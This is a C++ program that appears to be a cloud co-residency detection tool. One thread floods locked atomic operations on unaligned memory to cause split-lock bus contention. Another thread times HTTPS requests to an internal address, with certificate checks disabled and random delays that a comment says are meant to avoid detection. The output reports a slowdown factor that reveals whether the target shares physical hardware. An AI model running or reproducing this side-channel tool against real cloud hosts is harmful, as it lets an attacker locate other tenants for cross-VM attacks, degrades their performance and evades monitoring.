#include <stdint.h>
#include <chrono>
#include <iostream>
#include <atomic>
#include <thread>
#include <condition_variable>
#include <curl/curl.h>
#include <random>

using namespace std;

long double normalDelay;
long double coResidentDelay;

double avg;
long long nrCounts;

std::random_device rd;  // Obtain a random seed
std::mt19937 gen(rd()); // Initialize a Mersenne Twister with the seed

// Used for a random wait time between requests to avoid detection
std::uniform_real_distribution<float> dist(0.0f, 1.0f);

CURL* curl;
CURLcode res;

std::atomic<bool> test_measurement(false); // Flag to signal when to measure
std::mutex mtx; // Mutex for synchronization

// Callback function to write the response body to a string
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void lockBus() {
    const size_t N = 10000;
    const size_t size = 8 * (N + 1);
    int add_value = 5;

    size_t test_length = 0;

    // Allocate memory and create unaligned pointer
    char* char_ptr = new char[size];
    char* unaligned = char_ptr + 2;

    while(1) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        
        avg = 0.0f;
        nrCounts = 0;
        test_length = 0;

        {
            mtx.lock();
            test_measurement.store(true);
            mtx.unlock();
        }

        while (test_length < 1000) {
            test_length++;
            // Loop over the range 1..N

            for (int i = 0; i < 100000; ++i) {
                __asm__ volatile (
                    "lock; xaddl %%eax, (%1);"                // XADD eax, [mem]
                    "mfence;"                                 // Ensure that previous memory operations complete before others can access
                    : "=a" (add_value)                        // Output: the result goes into eax (value)
                    : "r" (unaligned+i), "a" (add_value)      // Input: pointer and add_value
                );
            }
        }

        avg = 0.0f;
        nrCounts = 0;

        {
            mtx.lock();
            test_measurement.store(false);
            mtx.unlock();
        }
    }

    delete[] char_ptr;
}

void measureDelay() {
    std::string response_string;

    while(1) {
        // Sleep for a random delay
        this_thread::sleep_for(std::chrono::milliseconds((int)(dist(gen) * 1000)));

        curl_easy_setopt(curl, CURLOPT_URL, "https://10.0.1.1:443/");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        // Ignore SSL certificate validation
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Disable peer verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); // Disable host verification
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 1L);

        // Start measuring time
        auto start_time = std::chrono::high_resolution_clock::now();

        // Perform the GET request
        res = curl_easy_perform(curl);

        // End measuring time
        auto end_time = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double> duration = end_time - start_time;

        double delay = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();

        avg += delay;
        nrCounts++;
    }

    // Cleanup
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) return 1;

    thread worker_thread(lockBus);
    thread measurement(measureDelay);

    worker_thread.detach();
    measurement.detach();

    std::this_thread::sleep_for(std::chrono::seconds(5)); 
    while(1) {
        if (!test_measurement) {
            normalDelay = avg / nrCounts;
            cout << "Average for normal: " << normalDelay << " (" << nrCounts << ")" << "\n";
            cout << "----------------------\n";
        } else {
            coResidentDelay = avg / nrCounts;
            cout << "Average for test: " << coResidentDelay << " (" << nrCounts << ")" << "\n";
            cout << "Degradation factor: " << coResidentDelay / normalDelay << "\n";
            cout << "----------------------\n";
        }

        std::this_thread::sleep_for(std::chrono::seconds(2)); 
    }

    // Global cleanup for libcurl
    curl_global_cleanup();

    return 0;
}